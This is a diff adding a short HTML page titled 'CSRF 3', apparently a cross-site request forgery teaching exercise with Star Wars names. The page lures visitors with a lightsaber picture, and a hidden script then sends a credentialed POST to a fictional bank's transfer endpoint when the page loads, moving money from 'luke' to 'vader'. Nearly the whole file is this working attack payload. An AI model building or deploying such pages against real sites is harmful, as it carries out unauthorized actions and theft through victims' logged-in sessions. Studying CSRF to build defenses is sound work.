@@ -1,0 +1,18 @@
+<html>
+    <head>
+        <title>CSRF 3</title>
+    </head>
+    <body>
+        Nice lightsaber bro...
+        <img src='https://www.jedipedia.net/w/images/e/e6/Darth_Maul%27s_Lightsaber.jpg'>
+        <script>
+            fetch("http://www.jedibank.com/transfer", {
+                method: 'POST',
+                credentials: 'include',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: "from=luke&to=vader&amount=3000"
+            });
+        </script>
+    </body>
+</html>
+
